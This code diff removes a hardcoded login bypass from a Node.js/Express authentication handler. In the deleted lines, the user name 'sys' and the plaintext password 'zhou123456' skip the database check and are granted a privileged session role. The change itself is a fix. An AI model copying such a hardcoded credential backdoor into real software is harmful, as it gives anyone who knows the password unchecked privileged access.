@@ -16,17 +16,7 @@ exports.login = function(req, res, next) {
     var u = req.body.user;
     if (!u) return next('no user specified');
     // do User.findByName
-
-    if (u.name == 'sys' && u.password == 'zhou123456') {
-
-        req.session.role = "crapMgr";
-        res.send({
-            success: true
-        })
-
-        return;
-    }
-
+ 
     User.findOne({
             name: u.name
         })
